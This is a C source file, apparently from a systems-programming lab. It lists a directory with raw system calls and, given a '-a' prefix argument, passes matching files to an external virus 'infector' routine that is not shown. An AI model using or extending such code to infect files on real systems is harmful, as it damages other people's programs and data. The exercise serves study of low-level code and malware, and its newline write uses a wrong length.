#include "util.h"

#define SYS_WRITE 4
#define SYS_EXIT 1
#define SYS_GETDENTS 141
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define APPEND 1024
#define READONLY 0
#define PERMISSION 0777
#define CLOSE 6
#define BUFFSIZE 8192

extern int system_call();
extern int infector();
extern int infection();

typedef struct ent{
  int inode;
  int offset;
  short len;
  char buf[];
} ent;

int main (int argc , char* argv[], char* envp[])
{
  /*Complete the task here*/
  char buff[BUFFSIZE];
  int fd;
  ent* entp = buff;
  int count;
  int toInfect = 0;
  char* fName;
  char* v_attached = " VIRUS ATTACHED\n";


  if(argc == 2 && strncmp(argv[1], "-a", 2) == 0){
    toInfect = 1;
    fName = argv[1] + 2;
  }



  fd = system_call(SYS_OPEN, ".", READONLY, PERMISSION);
  if(fd < 0){
    system_call(SYS_EXIT, 0x55, 0, 0);
  }

  count = system_call(SYS_GETDENTS, fd, buff, BUFFSIZE);
  
  int i;
  for(i=0; i<count; i += entp->len){
    entp = buff + i;
    system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));

    if(toInfect == 1 && strncmp(entp->buf, fName, strlen(fName)) == 0){

      infector(entp->buf);
      system_call(SYS_WRITE, STDOUT, v_attached, strlen(v_attached));
    }

    system_call(SYS_WRITE, STDOUT, "\n", strlen(entp->buf));
  }

  
  return 0;
}
